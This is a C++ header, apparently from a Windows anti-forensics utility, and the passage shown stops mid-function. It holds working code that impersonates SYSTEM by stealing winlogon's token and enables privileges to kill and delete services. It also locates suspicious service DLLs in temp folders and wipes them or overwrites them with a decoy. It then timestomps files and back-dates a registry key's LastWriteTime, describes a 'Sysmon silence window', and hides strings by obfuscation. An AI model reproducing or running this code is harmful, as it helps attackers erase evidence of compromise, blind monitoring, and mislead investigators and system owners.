#pragma once
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <aclapi.h>
#include <string>
#include <atomic>
#include <functional>
#include "../Sysmon/Sysmon.hpp"
#include "../XorStr/XorStr.hpp"
#include "RepBypas.hpp"

// xorstr alias — Service.hpp original usa xorstr(), este projeto usa xorstr_()
#ifndef xorstr
#define xorstr(str) xorstr_(str)
#endif

// ─────────────────────────────────────────────────────────────────────────────
// RegTs — stampa LastWriteTime de uma chave via NtSetInformationKey(10).
// ─────────────────────────────────────────────────────────────────────────────
namespace RegTs {

    typedef NTSTATUS ( WINAPI* PfnNtSet )( HANDLE, INT, PVOID, ULONG );
    struct KEY_WRITE_TIME { LARGE_INTEGER LastWriteTime; };

    static PfnNtSet _Resolve( ) {
        HMODULE h = GetModuleHandleA( "ntdll.dll" );
        return h ? reinterpret_cast<PfnNtSet>(
                       GetProcAddress( h, "NtSetInformationKey" ) ) : nullptr;
    }

    static FILETIME Capture( HKEY root, const wchar_t* path ) {
        HKEY h = nullptr; FILETIME ft{};
        if ( RegOpenKeyExW( root, path, 0, KEY_QUERY_VALUE, &h ) == ERROR_SUCCESS ) {
            RegQueryInfoKeyW( h, nullptr, nullptr, nullptr, nullptr, nullptr,
                              nullptr, nullptr, nullptr, nullptr, nullptr, &ft );
            RegCloseKey( h );
        }
        return ft;
    }

    static bool SetTimestamp( HKEY root, const wchar_t* path, FILETIME target ) {
        if ( !target.dwLowDateTime && !target.dwHighDateTime ) return false;
        static PfnNtSet pfn = _Resolve();
        if ( !pfn ) return false;
        HKEY h = nullptr;
        if ( RegOpenKeyExW( root, path, REG_OPTION_BACKUP_RESTORE, KEY_SET_VALUE, &h ) != ERROR_SUCCESS )
            if ( RegOpenKeyExW( root, path, 0, KEY_SET_VALUE, &h ) != ERROR_SUCCESS )
                return false;
        KEY_WRITE_TIME wt{};
        wt.LastWriteTime.LowPart  = target.dwLowDateTime;
        wt.LastWriteTime.HighPart = target.dwHighDateTime;
        NTSTATUS st = pfn( h, 10, &wt, sizeof( wt ) );
        RegCloseKey( h );
        return st >= 0;
    }

    static FILETIME PreBootStamp( DWORD secondsBefore = 60 ) {
        FILETIME ftNow = {};
        GetSystemTimeAsFileTime( &ftNow );

        ULARGE_INTEGER ui = {};
        ui.LowPart  = ftNow.dwLowDateTime;
        ui.HighPart = ftNow.dwHighDateTime;

        ULONGLONG uptime100ns = GetTickCount64( ) * 10000ULL;
        if ( ui.QuadPart > uptime100ns )
            ui.QuadPart -= uptime100ns;

        ULONGLONG margin100ns = static_cast<ULONGLONG>( secondsBefore ) * 10000000ULL;
        if ( ui.QuadPart > margin100ns )
            ui.QuadPart -= margin100ns;

        FILETIME ft = {};
        ft.dwLowDateTime  = ui.LowPart;
        ft.dwHighDateTime = ui.HighPart;
        return ft;
    }

} // namespace RegTs


namespace DestructFiles {

    // ── Per-stage error flags ─────────────────────────────────────────────
    static const int DERR_STOP      = 0x01;
    static const int DERR_DELETE    = 0x02;
    static const int DERR_FILE      = 0x04;
    static const int DERR_INIT      = 0x08;
    static const int DERR_INIT_SCM  = 0x10;
    static const int DERR_INIT_SVC  = 0x20;
    static const int DERR_INIT_PATH = 0x40;

    // ── Callback state ────────────────────────────────────────────────────
    namespace _Cb {
        struct SvcEntry {
            wchar_t   svcName[ 256 ]          = {};
            wchar_t   dllPath[ MAX_PATH * 2 ] = {};
            DWORD     svchostPid              = 0;
            SC_HANDLE hSvc                    = nullptr;
            bool      useSCM                  = false;
        };
        static SvcEntry  entries[ 16 ]         = {};
        static int       entryCount            = 0;
        static FILETIME  tsServices            = {};
        static bool      systemImpersonated    = false;
        static std::atomic<bool>  done     { false };
        static std::atomic<bool>  ok       { false };
        static std::atomic<int>   errFlags { 0     };
        static std::atomic<DWORD> gleDelete{ 0     };
        static std::atomic<DWORD> gleFile  { 0     };
        static std::atomic<bool>  advanced { false };
        static std::function<void()> cleanJournalFn;
    }

    inline int   GetDestructErrors  ( ) { return _Cb::errFlags .load( ); }
    inline DWORD GetDestructGleDelete( ) { return _Cb::gleDelete.load( ); }
    inline DWORD GetDestructGleFile  ( ) { return _Cb::gleFile  .load( ); }
    inline bool  IsDestructAdvanced  ( ) { return _Cb::advanced .load( ); }

    static bool _EnablePrivilege( LPCWSTR privName ) {
        HANDLE hToken = nullptr;
        if ( !OpenProcessToken( GetCurrentProcess( ),
                                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
            return false;
        LUID luid{};
        if ( !LookupPrivilegeValueW( nullptr, privName, &luid ) ) {
            CloseHandle( hToken ); return false;
        }
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount             = 1;
        tp.Privileges[ 0 ].Luid       = luid;
        tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( tp ), nullptr, nullptr );
        bool ok = ( GetLastError( ) == ERROR_SUCCESS );
        CloseHandle( hToken );
        return ok;
    }

    static bool _NtTerminate( HANDLE hProc ) {
        typedef NTSTATUS ( WINAPI* PfnNtTerm )( HANDLE ProcessHandle, NTSTATUS ExitStatus );
        static PfnNtTerm pfn = nullptr;
        if ( !pfn ) {
            HMODULE h = GetModuleHandleA( "ntdll.dll" );
            if ( h ) pfn = reinterpret_cast<PfnNtTerm>(
                               GetProcAddress( h, "NtTerminateProcess" ) );
        }
        if ( !pfn ) return false;
        NTSTATUS st = pfn( hProc, 0 );
        return st >= 0 || st == 0xC0000010L;
    }

    static bool _IsElevated( ) {
        HANDLE hToken = nullptr;
        if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_QUERY, &hToken ) )
            return false;
        TOKEN_ELEVATION elev = {};
        DWORD sz = sizeof( elev );
        bool ok = GetTokenInformation( hToken, TokenElevation,
                                        &elev, sz, &sz )
                   && elev.TokenIsElevated;
        CloseHandle( hToken );
        return ok;
    }

    static bool _ImpersonateSystem( ) {
        const wchar_t* kTargets[] = { L"winlogon.exe", L"services.exe", L"wininit.exe", nullptr };

        HANDLE hSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
        if ( hSnap == INVALID_HANDLE_VALUE ) return false;

        DWORD sysPid = 0;
        PROCESSENTRY32W pe = { sizeof( pe ) };
        if ( Process32FirstW( hSnap, &pe ) ) {
            do {
                for ( int i = 0; kTargets[ i ] && !sysPid; i++ )
                    if ( _wcsicmp( pe.szExeFile, kTargets[ i ] ) == 0 )
                        sysPid = pe.th32ProcessID;
            } while ( !sysPid && Process32NextW( hSnap, &pe ) );
        }
        CloseHandle( hSnap );
        if ( !sysPid ) return false;

        HANDLE hProc = OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, sysPid );
        if ( !hProc ) return false;

        HANDLE hToken = nullptr;
        bool   result = false;

        if ( OpenProcessToken( hProc,
                               TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                               &hToken ) ) {
            HANDLE hDup = nullptr;
            if ( DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, nullptr,
                                   SecurityImpersonation, TokenImpersonation, &hDup ) ) {
                result = SetThreadToken( nullptr, hDup ) != FALSE;
                CloseHandle( hDup );
            }
            CloseHandle( hToken );
        }
        CloseHandle( hProc );
        return result;
    }

    static DWORD _FindPidByModule( const wchar_t* targetMod ) {
        if ( !targetMod || !targetMod[ 0 ] ) return 0;

        HANDLE hSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
        if ( hSnap == INVALID_HANDLE_VALUE ) return 0;

        DWORD           foundPid = 0;
        PROCESSENTRY32W pe       = { sizeof( pe ) };

        if ( Process32FirstW( hSnap, &pe ) ) {
            do {
                HANDLE hProc = OpenProcess(
                    PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID );
                if ( hProc ) {
                    HMODULE mods[ 512 ] = {};
                    DWORD   needed      = 0;
                    if ( EnumProcessModulesEx( hProc, mods, sizeof( mods ), &needed,
                                               LIST_MODULES_ALL ) ) {
                        DWORD count = min( needed / (DWORD)sizeof( HMODULE ), 512UL );
                        for ( DWORD i = 0; i < count && !foundPid; i++ ) {
                            wchar_t modPath[ MAX_PATH * 2 ] = {};
                            if ( GetModuleFileNameExW( hProc, mods[ i ], modPath, MAX_PATH * 2 ) ) {
                                wchar_t* fname = wcsrchr( modPath, L'\\' );
                                fname = fname ? fname + 1 : modPath;
                                if ( _wcsicmp( fname, targetMod ) == 0 )
                                    foundPid = pe.th32ProcessID;
                            }
                        }
                    }
                    CloseHandle( hProc );
                }
            } while ( !foundPid && Process32NextW( hSnap, &pe ) );
        }

        CloseHandle( hSnap );
        return foundPid;
    }

    static bool _FindBypassService( wchar_t* outName, DWORD outCch ) {
        HKEY hSvcs = nullptr;
        if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE,
                            xorstr( L"SYSTEM\\CurrentControlSet\\Services" ),
                            0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hSvcs ) != ERROR_SUCCESS )
            return false;

        bool    found  = false;
        DWORD   idx    = 0;
        wchar_t sub[ 256 ] = {};
        DWORD   subLen = 256;

        while ( !found &&
                RegEnumKeyExW( hSvcs, idx++, sub, &subLen,
                               nullptr, nullptr, nullptr, nullptr ) == ERROR_SUCCESS ) {
            subLen = 256;

            wchar_t paramKey[ 520 ] = {};
            wcsncpy_s( paramKey, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
            wcsncat_s( paramKey, 520, sub,             _TRUNCATE );
            wcsncat_s( paramKey, 520, L"\\Parameters", _TRUNCATE );

            HKEY hParam = nullptr;
            if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE, paramKey, 0, KEY_READ, &hParam ) == ERROR_SUCCESS ) {
                wchar_t raw[ MAX_PATH * 2 ] = {};
                DWORD   cb = sizeof( raw );
                if ( RegQueryValueExW( hParam, xorstr( L"ServiceDll" ), nullptr, nullptr,
                                       reinterpret_cast<LPBYTE>( raw ), &cb ) == ERROR_SUCCESS
                     && raw[ 0 ] != L'\0' ) {
                    wchar_t* src = raw;
                    if ( src[ 0 ] == L'"' ) { src++; wchar_t* q = wcschr( src, L'"' ); if ( q ) *q = L'\0'; }

                    wchar_t exp[ MAX_PATH * 2 ] = {};
                    ExpandEnvironmentStringsW( src, exp, MAX_PATH * 2 );
                    _wcslwr_s( exp, MAX_PATH * 2 );

                    bool inTemp = wcsstr( exp, xorstr( L"\\appdata\\local\\temp\\" ) ) != nullptr
                               || wcsstr( exp, xorstr( L"\\windows\\temp\\" )       ) != nullptr;

                    if ( inTemp ) {
                        wcsncpy_s( outName, outCch, sub, outCch - 1 );
                        found = true;
                    }
                }
                RegCloseKey( hParam );
            }
        }

        RegCloseKey( hSvcs );
        return found;
    }

    static bool _ResolveDllPath( const wchar_t* svcName, DWORD svchostPid, wchar_t* outPath, DWORD outCch ) {
        wchar_t raw     [ MAX_PATH * 2 ] = {};
        wchar_t expanded[ MAX_PATH * 2 ] = {};

        {
            wchar_t regPath[ 520 ] = {};
            wcsncpy_s( regPath, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
            wcsncat_s( regPath, 520, svcName,       _TRUNCATE );
            wcsncat_s( regPath, 520, L"\\Parameters", _TRUNCATE );

            HKEY hKey = nullptr;
            if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hKey ) == ERROR_SUCCESS ) {
                DWORD cb = sizeof( raw );
                RegQueryValueExW( hKey, xorstr( L"ServiceDll" ), nullptr, nullptr,
                                  reinterpret_cast<LPBYTE>( raw ), &cb );
                RegCloseKey( hKey );
            }
        }

        if ( raw[ 0 ] != L'\0' ) {
            wchar_t* src = raw;
            if ( src[ 0 ] == L'"' ) { src++; wchar_t* c = wcschr( src, L'"' ); if ( c ) *c = L'\0'; }
            DWORD n = ExpandEnvironmentStringsW( src, expanded, MAX_PATH * 2 );
            if ( n > 0 && n <= MAX_PATH * 2 && expanded[ 0 ] != L'\0' ) {
                if ( GetFileAttributesW( expanded ) != INVALID_FILE_ATTRIBUTES ) {
                    wcsncpy_s( outPath, outCch, expanded, outCch - 1 );
                    return true;
                }
            }
        }

        if ( svchostPid ) {
            wchar_t* filename = nullptr;
            if ( expanded[ 0 ] ) {
                filename = wcsrchr( expanded, L'\\' );
                if ( filename ) filename++;
            }
            if ( ( !filename || !filename[ 0 ] ) && raw[ 0 ] ) {
                filename = wcsrchr( raw, L'\\' );
                filename = filename ? filename + 1 : raw;
            }

            if ( filename && filename[ 0 ] ) {
                HANDLE hProc = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                             FALSE, svchostPid );
                if ( hProc ) {
                    HMODULE mods[ 512 ] = {};
                    DWORD   needed = 0;
                    if ( EnumProcessModulesEx( hProc, mods, sizeof( mods ), &needed,
                                               LIST_MODULES_ALL ) ) {
                        DWORD count = min( needed / (DWORD)sizeof( HMODULE ), 512UL );
                        for ( DWORD i = 0; i < count; i++ ) {
                            wchar_t modPath[ MAX_PATH * 2 ] = {};
                            if ( GetModuleFileNameExW( hProc, mods[ i ], modPath, MAX_PATH * 2 ) ) {
                                wchar_t* modName = wcsrchr( modPath, L'\\' );
                                modName = modName ? modName + 1 : modPath;
                                if ( _wcsicmp( modName, filename ) == 0 ) {
                                    wcsncpy_s( outPath, outCch, modPath, outCch - 1 );
                                    CloseHandle( hProc );
                                    return true;
                                }
                            }
                        }
                    }
                    CloseHandle( hProc );
                }
            }
        }

        if ( expanded[ 0 ] ) {
            wcsncpy_s( outPath, outCch, expanded, outCch - 1 );
            return true;
        }

        return false;
    }

    static HANDLE _OpenFileRetry( const wchar_t* path, DWORD maxWaitMs = 5000 ) {
        HANDLE h = INVALID_HANDLE_VALUE;
        const DWORD kFlags = FILE_ATTRIBUTE_NORMAL
                           | FILE_FLAG_WRITE_THROUGH
                           | FILE_FLAG_BACKUP_SEMANTICS;
        DWORD lastGle = 0;
        for ( DWORD e = 0; h == INVALID_HANDLE_VALUE && e < maxWaitMs; e += 200 ) {
            h = CreateFileW( path, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                             OPEN_EXISTING, kFlags, nullptr );
            if ( h == INVALID_HANDLE_VALUE ) {
                lastGle = GetLastError( );
                if ( lastGle == ERROR_FILE_NOT_FOUND || lastGle == ERROR_PATH_NOT_FOUND )
                    break;
                Sleep( 200 );
            }
        }
        if ( h == INVALID_HANDLE_VALUE )
            _Cb::gleFile.store( lastGle );
        return h;
    }

    static bool _DeleteLocked( const wchar_t* path ) {
        if ( !path || !path[ 0 ] ) return false;

        typedef NTSTATUS ( WINAPI* PfnNtSIF )(
            HANDLE FileHandle,
            PVOID  IoStatusBlock,
            PVOID  FileInformation,
            ULONG  Length,
            ULONG  FileInformationClass );
        static PfnNtSIF pfnNtSIF = nullptr;
        if ( !pfnNtSIF ) {
            HMODULE h = GetModuleHandleA( "ntdll.dll" );
            if ( h ) pfnNtSIF = reinterpret_cast<PfnNtSIF>(
                                    GetProcAddress( h, "NtSetInformationFile" ) );
        }

        struct _IOSB  { ULONG_PTR Status; ULONG_PTR Info; } iosb{};
        struct _FDIEx { ULONG Flags; }                      fdi{ 0x3 };

        const DWORD kShare = FILE_SHARE_READ | FILE_SHARE_DELETE;
        const DWORD kFlags = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS;
        HANDLE hFile = CreateFileW( path, DELETE | SYNCHRONIZE,
                                    kShare, nullptr, OPEN_EXISTING, kFlags, nullptr );

        bool unlinked = false;

        if ( hFile != INVALID_HANDLE_VALUE ) {
            if ( pfnNtSIF ) {
                NTSTATUS st = pfnNtSIF( hFile, &iosb, &fdi, sizeof( fdi ), 64 );
                unlinked = ( st >= 0 );
            }
            CloseHandle( hFile );
        }

        if ( !unlinked ) {
            wchar_t bak[ MAX_PATH * 2 + 8 ] = {};
            wcsncpy_s( bak, MAX_PATH * 2 + 8, path, _TRUNCATE );
            wcsncat_s( bak, MAX_PATH * 2 + 8, L".bak", _TRUNCATE );
            unlinked = MoveFileExW( path, bak, MOVEFILE_REPLACE_EXISTING ) != FALSE;
        }

        if ( !unlinked )
            _Cb::gleFile.store( GetLastError( ) );

        return unlinked;
    }

    static bool _WipeFile( const wchar_t* path ) {
        if ( !path || !path[ 0 ] ) return false;

        HANDLE hFile = _OpenFileRetry( path );
        if ( hFile == INVALID_HANDLE_VALUE ) {
            DWORD gle = _Cb::gleFile.load( );
            if ( gle == ERROR_FILE_NOT_FOUND || gle == ERROR_PATH_NOT_FOUND )
                return true;
            if ( gle == ERROR_SHARING_VIOLATION )
                return _DeleteLocked( path );
            return false;
        }

        LARGE_INTEGER sz{};
        GetFileSizeEx( hFile, &sz );

        if ( sz.QuadPart > 0 ) {
            BYTE  chunk[ 65536 ];
            BYTE pats[ 2 ] = { 0xFF, 0x00 };
            for ( int p = 0; p < 2; p++ ) {
                memset( chunk, pats[ p ], sizeof( chunk ) );
                SetFilePointer( hFile, 0, nullptr, FILE_BEGIN );
                LONGLONG rem = sz.QuadPart;
                while ( rem > 0 ) {
                    DWORD w  = 0;
                    DWORD tw = rem > (LONGLONG)sizeof( chunk )
                                   ? (DWORD)sizeof( chunk )
                                   : (DWORD)rem;
                    if ( !WriteFile( hFile, chunk, tw, &w, nullptr ) || !w ) break;
                    rem -= w;
                }
            }
        }

        SetFilePointer( hFile, 0, nullptr, FILE_BEGIN );
        SetEndOfFile( hFile );
        CloseHandle( hFile );
        return true;
    }

    static bool _SetTimestampsFromRef( HANDLE hTarget, const wchar_t* refPath ) {
        HANDLE hRef = CreateFileW( refPath, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                   nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
        if ( hRef == INVALID_HANDLE_VALUE ) return false;
        FILETIME ftCre{}, ftAcc{}, ftWri{};
        bool ok = GetFileTime( hRef, &ftCre, &ftAcc, &ftWri ) != FALSE;
        CloseHandle( hRef );
        if ( !ok ) return false;
        return SetFileTime( hTarget, &ftCre, &ftAcc, &ftWri ) != FALSE;
    }

    static bool _ReplaceFile( const wchar_t* path ) {
        if ( !path || !path[ 0 ] ) return false;

        HANDLE hFile = _OpenFileRetry( path );
        if ( hFile == INVALID_HANDLE_VALUE ) {
            DWORD gle = _Cb::gleFile.load( );
            if ( gle == ERROR_FILE_NOT_FOUND || gle == ERROR_PATH_NOT_FOUND )
                return true;
            if ( gle == ERROR_SHARING_VIOLATION )
                return _DeleteLocked( path );
            return false;
        }

        SetFilePointer( hFile, 0, nullptr, FILE_BEGIN );
        const DWORD totalSize = (DWORD)sizeof( vfcompat );
        DWORD offset  = 0;
        bool  writeOk = true;
        while ( offset < totalSize ) {
            DWORD toWrite = ( totalSize - offset > 65536u ) ? 65536u : ( totalSize - offset );
            DWORD w = 0;
            if ( !WriteFile( hFile,
                             reinterpret_cast<const BYTE*>( vfcompat ) + offset,
                             toWrite, &w, nullptr ) || !w ) {
                _Cb::gleFile.store( GetLastError( ) );
                writeOk = false;
                break;
            }
            offset += w;
        }

        SetFilePointer( hFile, (LONG)totalSize, nullptr, FILE_BEGIN );
        SetEndOfFile( hFile );
        _SetTimestampsFromRef( hFile, xorstr( L"C:\\Windows\\System32\\msafd.dll" ) );
        CloseHandle( hFile );
        return writeOk;
    }

    static bool _StopService( _Cb::SvcEntry& e ) {
        auto _PollStopped = [ ]( SC_HANDLE hS ) -> bool {
            SERVICE_STATUS ss = {};
            if ( QueryServiceStatus( hS, &ss ) &&
                 ss.dwCurrentState == SERVICE_STOPPED ) return true;
            DWORD budget = ( ss.dwCurrentState == SERVICE_STOP_PENDING ) ? 3000 : 500;
            for ( DWORD t = 0; t < budget; t += 100 ) {
                Sleep( 100 );
                if ( !QueryServiceStatus( hS, &ss ) ) break;
                if ( ss.dwCurrentState == SERVICE_STOPPED ) return true;
                if ( ss.dwCurrentState == SERVICE_STOP_PENDING && budget < 3000 )
                    budget = t + 3000;
            }
            return false;
        };

        if ( e.hSvc ) {
            SERVICE_STATUS ss = {};
            if ( ControlService( e.hSvc, SERVICE_CONTROL_STOP, &ss ) ||
                 GetLastError( ) == ERROR_SERVICE_NOT_ACTIVE ) {
                if ( _PollStopped( e.hSvc ) ) return true;
            }
        }

        {
            SC_HANDLE hSCM2 = OpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
            if ( hSCM2 ) {
                SC_HANDLE hStop = OpenServiceW( hSCM2, e.svcName,
                                                SERVICE_STOP | SERVICE_QUERY_STATUS );
                if ( hStop ) {
                    SERVICE_STATUS ss = {};
                    ControlService( hStop, SERVICE_CONTROL_STOP, &ss );
                    bool stopped = GetLastError( ) == ERROR_SERVICE_NOT_ACTIVE
                                || _PollStopped( hStop );
                    CloseServiceHandle( hStop );
                    CloseServiceHandle( hSCM2 );
                    if ( stopped ) return true;
                } else {
                    CloseServiceHandle( hSCM2 );
                }
            }
        }

        {
            wchar_t regPath[ 520 ] = {};
            wcsncpy_s( regPath, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
            wcsncat_s( regPath, 520, e.svcName, _TRUNCATE );
            HKEY hKey = nullptr;
            if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE, regPath, 0,
                                KEY_SET_VALUE, &hKey ) == ERROR_SUCCESS ) {
                DWORD val = 4;
                RegSetValueExW( hKey, xorstr( L"Start" ), 0, REG_DWORD,
                                reinterpret_cast<const BYTE*>( &val ), sizeof( val ) );
                RegCloseKey( hKey );
            }
            SC_HANDLE hSCM3 = OpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
            if ( hSCM3 ) {
                SC_HANDLE hStop = OpenServiceW( hSCM3, e.svcName,
                                                SERVICE_STOP | SERVICE_QUERY_STATUS );
                if ( hStop ) {
                    SERVICE_STATUS ss = {};
                    ControlService( hStop, SERVICE_CONTROL_STOP, &ss );
                    bool stopped = GetLastError( ) == ERROR_SERVICE_NOT_ACTIVE
                                || _PollStopped( hStop );
                    CloseServiceHandle( hStop );
                    CloseServiceHandle( hSCM3 );
                    if ( stopped ) return true;
                } else {
                    CloseServiceHandle( hSCM3 );
                }
            }
        }

        if ( e.svchostPid ) {
            HANDLE hProc = OpenProcess( PROCESS_TERMINATE | SYNCHRONIZE,
                                        FALSE, e.svchostPid );
            if ( !hProc )
                hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, e.svchostPid );
            if ( hProc ) {
                bool killed = TerminateProcess( hProc, 0 ) != FALSE;
                if ( !killed ) killed = _NtTerminate( hProc );
                WaitForSingleObject( hProc, 2000 );
                CloseHandle( hProc );
                if ( killed ) return true;
            }
        }

        _Cb::errFlags |= DERR_STOP;
        return false;
    }

    static bool _DeleteService( _Cb::SvcEntry& e ) {
        if ( e.useSCM && e.hSvc ) {
            BOOL  deleted = DeleteService( e.hSvc );
            DWORD gle     = GetLastError( );
            CloseServiceHandle( e.hSvc );
            e.hSvc = nullptr;
            if ( deleted || gle == ERROR_SERVICE_MARKED_FOR_DELETE ) return true;
        } else if ( e.hSvc ) {
            CloseServiceHandle( e.hSvc );
            e.hSvc = nullptr;
        }

        if ( e.svcName[ 0 ] == L'\0' ) {
            _Cb::gleDelete.store( ERROR_NOT_FOUND );
            _Cb::errFlags |= DERR_DELETE;
            return false;
        }

        wchar_t svcKey[ 520 ] = {};
        wcsncpy_s( svcKey, 520, L"SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
        wcsncat_s( svcKey, 520, e.svcName, _TRUNCATE );

        LSTATUS st = RegDeleteTreeW( HKEY_LOCAL_MACHINE, svcKey );
        if ( st == ERROR_SUCCESS || st == ERROR_FILE_NOT_FOUND ) return true;

        {
            HKEY hSvcs = nullptr;
            if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE,
                                xorstr( L"SYSTEM\\CurrentControlSet\\Services" ),
                                REG_OPTION_BACKUP_RESTORE, KEY_WRITE, &hSvcs ) == ERROR_SUCCESS ) {
                st = RegDeleteTreeW( hSvcs, e.svcName );
                RegCloseKey( hSvcs );
                if ( st == ERROR_SUCCESS || st == ERROR_FILE_NOT_FOUND ) return true;
            }
        }

        {
            PSID pSystem = nullptr;
            SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
            if ( AllocateAndInitializeSid( &ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                           0, 0, 0, 0, 0, 0, 0, &pSystem ) ) {
                wchar_t regSecPath[ 600 ] = {};
                wcsncpy_s( regSecPath, 600, L"MACHINE\\SYSTEM\\CurrentControlSet\\Services\\", _TRUNCATE );
                wcsncat_s( regSecPath, 600, e.svcName, _TRUNCATE );

                SetNamedSecurityInfoW( regSecPath, SE_REGISTRY_KEY,
                                       OWNER_SECURITY_INFORMATION,
                                       pSystem, nullptr, nullptr, nullptr );

                EXPLICIT_ACCESSW ea     = {};
                ea.grfAccessPermissions = KEY_ALL_ACCESS;
                ea.grfAccessMode        = SET_ACCESS;
                ea.grfInheritance       = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
                ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
                ea.Trustee.TrusteeType  = TRUSTEE_IS_USER;
                ea.Trustee.ptstrName    = reinterpret_cast<LPWCH>( pSystem );

                PACL pAcl = nullptr;
                if ( SetEntriesInAclW( 1, &ea, nullptr, &pAcl ) == ERROR_SUCCESS ) {
                    SetNamedSecurityInfoW( regSecPath, SE_REGISTRY_KEY,
                                          DACL_SECURITY_INFORMATION,
                                          nullptr, nullptr, pAcl, nullptr );
                    LocalFree( pAcl );
                }
                FreeSid( pSystem );
            }

            st = RegDeleteTreeW( HKEY_LOCAL_MACHINE, svcKey );
            if ( st == ERROR_SUCCESS || st == ERROR_FILE_NOT_FOUND ) return true;
        }

        _Cb::gleDelete.store( (DWORD)st );
        _Cb::errFlags |= DERR_DELETE;
        return false;
    }

    static void _PatchCallback( ) {

        _Cb::systemImpersonated = _ImpersonateSystem( );

        {
            static const wchar_t* const kSentinels[] = {
                L"SYSTEM\\CurrentControlSet\\Services\\Tcpip",
                L"SYSTEM\\CurrentControlSet\\Services\\BFE",
                L"SYSTEM\\CurrentControlSet\\Services\\Dnscache",
                nullptr
            };
            for ( int si = 0; kSentinels[ si ]; si++ ) {
                HKEY hSent = nullptr;
                if ( RegOpenKeyExW( HKEY_LOCAL_MACHINE, kSentinels[ si ], 0,
                                    KEY_QUERY_VALUE | KEY_SET_VALUE, &hSent ) != ERROR_SUCCESS )
                    continue;
                DWORD type = REG_DWORD, val = 0, cb = sizeof( val );
                if ( RegQueryValueExW( hSent, xorstr( L"Start" ), nullptr,
                                       &type, reinterpret_cast<LPBYTE>( &val ), &cb ) == ERROR_SUCCESS &&
                     RegSetValueExW( hSent, xorstr( L"Start" ), 0,
                                     type, reinterpret_cast<const BYTE*>( &val ), cb ) == ERROR_SUCCESS ) {
                    RegCloseKey( hSent );
                    break;
                }
                RegCloseKey( hSent );
            }
        }

        for ( int i = 0; i < _Cb::entryCount; i++ ) {
            auto& e = _Cb::entries[ i ];

            _StopService( e );
            _DeleteService( e );

            if ( e.dllPath[ 0 ] ) {
                if ( _wcsicmp( e.dllPath, xorstr( L"C:\\Windows\\vfcompat.dll" ) ) == 0 ) {
                    _Cb::advanced = true;
                    if ( !_ReplaceFile( e.dllPath ) )
                        _Cb::errFlags |= DERR_FILE;
                } else {
                    if ( !_WipeFile( e.dllPath ) )
                        _Cb::errFlags |= DERR_FILE;
                }
            }
        }

        if ( _Cb::cleanJournalFn )
            _Cb::cleanJournalFn( );

        _Cb::ok = ( ( _Cb::errFlags.load( ) & ( DERR_DELETE | DERR_FILE ) ) == 0 );

        RegTs::SetTimestamp( HKEY_LOCAL_MACHINE,
                             xorstr( L"SYSTEM\\CurrentControlSet\\Services" ),
                             RegTs::PreBootStamp( 60 ) );

        if ( _Cb::systemImpersonated ) {
            RevertToSelf( );
            _Cb::systemImpersonated = false;
        }

        _Cb::done = true;
    }

    // ─────────────────────────────────────────────────────────────────────
    // DestructService — entry principal.
    //
    // targets: lista de nomes de serviço terminada em nullptr.
    //   Ex: const wchar_t* t[] = { L"fxsti", nullptr };
    //
    // Abre uma única janela de silêncio do Sysmon para destruir todos os
    // serviços listados de uma só vez.
    // ─────────────────────────────────────────────────────────────────────
    inline bool DestructService( const wchar_t* const* targets, std::function<void()> journalFn = nullptr ) {

        _Cb::errFlags           = 0;
        _Cb::gleDelete          = 0;
        _Cb::gleFile            = 0;
        _Cb::done               = false;
        _Cb::ok                 = false;
        _Cb::systemImpersonated = false;
        _Cb::entryCount         = 0;
        _Cb::advanced           = false;
        _Cb::cleanJournalFn     = std::move( journalFn );
        for ( int i = 0; i < 16; i++ ) {
            if ( _Cb::entries[ i ].hSvc )
                CloseServiceHandle( _Cb::entries[ i ].hSvc );
        }
        memset( _Cb::entries, 0, sizeof( _Cb::entries ) );

        _Cb::tsServices = RegTs::Capture( HKEY_LOCAL_MACHINE,
            xorstr( L"SYSTEM\\CurrentControlSet\\Services" ) );

        _EnablePrivilege( SE_DEBUG_NAME          );
        _EnablePrivilege( SE_BACKUP_NAME         );
        _EnablePrivilege( SE_RESTORE_NAME        );
        _EnablePrivilege( SE_TAKE_OWNERSHIP_NAME );

        SC_HANDLE hSCM = OpenSCManagerW( nullptr, nullptr, SC_MANAGER_CONNECT );
        if ( !hSCM ) _Cb::errFlags |= DERR_INIT_SCM;

        const DWORD kFull   = SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE;
        const DWORD kDelete = DELETE;

        // Itera sobre os targets fornecidos pelo caller
